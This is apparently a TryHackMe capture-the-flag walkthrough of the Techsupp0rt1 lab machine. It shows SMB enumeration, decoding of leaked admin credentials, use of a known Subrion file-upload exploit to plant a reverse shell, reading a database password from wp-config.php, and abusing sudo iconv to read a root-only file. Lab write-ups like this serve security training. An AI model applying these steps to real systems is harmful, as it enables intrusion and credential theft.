---
title: Techsupp0rt1
date: '2024-12-30'
category: tryhackme
tags: tryhackme, ctf
description: Detailed technical walkthrough and security analysis for the Techsupp0rt1
  machine on TryHackMe.
slug: techsupp0rt1
---




```
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

```

```
smbclient -L \\\\10.66.145.77\\                                          
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        websvr          Disk      
        IPC$            IPC       IPC Service (TechSupport server (Samba, Ubuntu))

```

```
smbclient -N //10.66.145.77/websvr 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat May 29 03:17:38 2021
  ..                                  D        0  Sat May 29 03:03:47 2021
  enter.txt                           N      273  Sat May 29 03:17:38 2021

                8460484 blocks of size 1024. 5699672 blocks available
smb: \> cat enter.txt
cat: command not found
smb: \> type enter.txt
type: command not found
smb: \> get enter.txt
getting file \enter.txt of size 273 as enter.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \> exit

```

```
 cat enter.txt         
GOALS
=====
1)Make fake popup and host it online on Digital Ocean server
2)Fix subrion site, /subrion doesn't work, edit from panel
3)Edit wordpress website

IMP
===
Subrion creds
|->admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]
Wordpress creds
|->
     
```

> to get password
```
FROM

base58 --> base32 --> base64 
```

> login to ‘Subrion/Pannel'

```
└─$ searchsploit 'subrion'

Subrion CMS 4.2.1 - Arbitrary File Upload                                                                               | php/webapps/49876.py

```

> before upload reverse shell need to change filetype  `phar`

```
www-data@TechSupport:/var/www$ cd html
www-data@TechSupport:/var/www/html$ ls
index.html  phpinfo.php  subrion  test  wordpress
www-data@TechSupport:/var/www/html$ cd wordpress
www-data@TechSupport:/var/www/html/wordpress$ ls
index.php        wp-blog-header.php    wp-includes        wp-settings.php
license.txt      wp-comments-post.php  wp-links-opml.php  wp-signup.php
readme.html      wp-config.php         wp-load.php        wp-trackback.php
wp-activate.php  wp-content            wp-login.php       xmlrpc.php
wp-admin         wp-cron.php           wp-mail.php
www-data@TechSupport:/var/www/html/wordpress$ cat wp-config.php
<?php
/**

 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wpdb' );

/** MySQL database username */
define( 'DB_USER', 'support' );

/** MySQL database password */
define( 'DB_PASSWORD', 'ImAScammerLOL!123!' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 *


/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/wordpress/' );
}



```

```
Matching Defaults entries for scamsite on TechSupport:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User scamsite may run the following commands on TechSupport:
    (ALL) NOPASSWD: /usr/bin/iconv

```

```
 LFILE=/root/root.txt
scamsite@TechSupport:/home$ sudo /usr/bin/iconv -f 8859_1 -t 8859_1 "$LFILE"
.......................  -
scamsite@TechSupport:/home$ 

```